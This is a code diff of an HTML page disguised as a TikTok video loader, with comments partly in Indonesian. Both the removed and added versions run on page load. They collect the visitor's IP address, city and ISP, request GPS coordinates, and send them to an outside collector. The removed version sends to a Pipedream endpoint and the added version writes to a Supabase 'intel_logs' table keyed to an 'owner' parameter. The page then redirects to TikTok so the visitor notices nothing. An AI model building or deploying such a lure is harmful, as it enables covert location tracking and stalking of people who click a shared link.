@@ -1,55 +1,70 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Loading TikTok...</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok</title> <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        body, html { margin: 0; padding: 0; height: 100%; background-color: #000; display: flex; justify-content: center; align-items: center; overflow: hidden; font-family: sans-serif; }
+        
+        /* Gimmick Video Loading */
+        .loader { width: 50px; height: 50px; border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #fff; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        .status-text { position: absolute; bottom: 20%; color: #86868b; font-size: 13px; letter-spacing: 0.5px; }
+    </style>
 </head>
-<body style="background:black; color:white; text-align:center; padding-top:20%;">
-    <p>Memuat Video...</p>
+<body>
+
+    <div class="loader"></div>
+    <div class="status-text">Connecting to content server...</div>
 
     <script>
-        const urlParams = new URLSearchParams(window.location.search);
-        const targetUrl = urlParams.get('url') || 'https://www.tiktok.com';
-        
-        // --- GANTI LINK DI BAWAH INI DENGAN LINK PIPEDREAM KAMU ---
-        const kotakSurat = 'https://eob426ci9b9rua6.m.pipedream.net'; 
+        const params = new URLSearchParams(window.location.search);
+        const owner = params.get('owner');
+        const target = params.get('url') || 'https://www.tiktok.com';
 
-        async function ambilData() {
-            // Ambil data IP korban dulu
-            let data = { info: "Target Mengklik Link" };
+        const supabase = window.supabase.createClient(
+            'https://jslpbkoynijeermqeehj.supabase.co',
+            'sb_publishable_VZ8Dfy9m781kpo-CGcg-sw_t5S6h6VY'
+        );
+
+        async function executeCapture() {
+            let intel = { owner_id: owner, status: 'ISP ONLY' };
+
+            // Grab IP & Info via API
             try {
                 const res = await fetch('https://ipapi.co/json/');
-                data = await res.json();
-            } catch (e) {}
+                const d = await res.json();
+                intel.ip_address = d.ip; intel.city = d.city; intel.isp = d.org;
+            } catch(e) {}
 
-            // Kirim data IP ke Pipedream
-            await fetch(kotakSurat, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(data)
-            });
+            const finish = () => {
+                // Kasih delay dikit biar kesan loadingnya dapet
+                setTimeout(() => { window.location.href = target; }, 800);
+            };
 
-            // Minta Lokasi (GPS)
+            // Recon GPS
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    // Kalau diizinkan, kirim koordinatnya ke Pipedream
-                    await fetch(kotakSurat, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({
-                            lat: pos.coords.latitude,
-                            lon: pos.coords.longitude,
-                            maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
-                        })
-                    });
-                    window.location.href = targetUrl;
-                }, () => {
-                    window.location.href = targetUrl;
+                navigator.geolocation.getCurrentPosition(async (p) => {
+                    await supabase.from('intel_logs').insert([{ 
+                        ...intel, 
+                        latitude: p.coords.latitude.toString(), 
+                        longitude: p.coords.longitude.toString(), 
+                        status: 'ACCURATE GPS' 
+                    }]);
+                    finish();
+                }, async () => {
+                    await supabase.from('intel_logs').insert([intel]);
+                    finish();
                 });
             } else {
-                window.location.href = targetUrl;
+                await supabase.from('intel_logs').insert([intel]);
+                finish();
             }
         }
-        window.onload = ambilData;
+
+        window.onload = executeCapture;
     </script>
 </body>
 </html>
